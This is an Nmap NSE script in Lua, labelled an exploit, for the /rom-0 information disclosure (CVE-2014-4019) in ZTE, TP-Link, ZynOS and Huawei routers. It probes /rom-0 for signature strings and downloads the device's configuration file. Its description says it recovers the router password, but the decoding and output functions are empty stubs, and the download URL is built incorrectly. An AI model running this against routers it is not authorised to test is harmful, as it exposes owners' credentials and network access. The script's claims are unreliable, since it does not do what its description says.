
description = [[
Attempts to rom-0 file on the target system.
After downloading, it autmaticaly decode it's content and return password of the targeted router.
]]

author = "@0xbadarg <0xbadarg [at] gmail >"
license = "GPL 3.0"
categories = {"exploit"}


local http = require "http"
local nmap = require "nmap"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local shortport = require "shortport"
local table = require "table"

portrule = shortport.http

function download_rom(ip, port, path)
	addr = "http://" .. ip .. ":" .. path
	
	local response = http.get_url(addr)
	
	rom_file_name = ip .. "rom0"
	file = io.open(rom_file_name, "w")
	io.output(file)
	io.write(response.body)
	io.close(file)

	print("Rom-0 file downloaded!")
	decode_rom(rom_file_name)
end

function decode_rom(rom_file)




	print "rom file decoded"
end

function save_output(host, password)

end

action = function(host, port)
	local vuln = {
	    title = '/rom-0 information disclosure present in ZTE, TP-Link, ZynOS, Huawei',
	    state = vulns.STATE.NOT_VULN,
	    description = [[
			Information disclosure present in RomPager Embedded Web Server.
			Affected devices include ZTE, TP-Link, ZynOS, Huawei and many others.
			ZTE, TP-Link, ZynOS, Huawei and possibly others are vulnerable to remote credential and information disclosure.
			Attackers can query the URIs "/rom-0" to extract sensitive information.
	    ]],
	    references = {
	      'http://www.hakim.ws/huawei/rom-0/kender.html',
	      'http://rootatnasro.wordpress.com/2014/01/11/how-i-saved-your-a-from-the-zynos-rom-0-attack-full-disclosure/',
	      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-4019',
	      'http://www.osvdb.org/show/osvdb/102668'
	    },
	    dates = {
	      disclosure = {year = '2014', month = '01', day = '11'},
	    },
	  }
	
	local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  	local open_session = http.get(host.ip, port, "/rom-0")
	if open_session and open_session.status == 200 then
		if open_session.body:match("dbgarea") or open_session.body:match("spt.dat") or open_session.body:match("autoexec.net") then
			vuln.state = vulns.STATE.VULN
			download_rom(host.ip, port, "/rom-0")

			return vuln_report:make_output(vuln)
		else
			vuln.state = vulns.STATE.LIKELY_VULN
			vuln.extra_info = "Correct HTTP (200) answer but uncorrect signature. Check manually!"
			return vuln_report:make_output(vuln)
		end
	end	


end
